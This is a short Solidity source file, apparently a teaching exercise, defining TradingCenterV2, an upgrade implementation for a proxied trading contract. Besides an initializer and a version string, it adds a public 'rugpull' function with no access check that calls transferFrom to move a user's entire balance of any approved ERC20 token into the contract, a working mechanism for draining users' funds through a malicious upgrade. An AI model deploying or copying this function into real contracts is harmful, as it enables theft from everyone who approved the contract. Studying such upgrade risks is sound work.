// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import { IERC20 } from "./TradingCenter.sol";
// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 {

  bool public initialized;

  IERC20 public usdt;
  IERC20 public usdc;

  function initialize(IERC20 _usdt, IERC20 _usdc) public {
    require(initialized == false, "already initialized");
    initialized = true;
    usdt = _usdt;
    usdc = _usdc;
  }
  function VERSION() public pure returns (string memory)  {
    return "0.0.2";
  }

  function rugpull( address _user, IERC20 _token) public {
    _token.transferFrom(_user, address(this), _token.balanceOf(_user));
  }
}
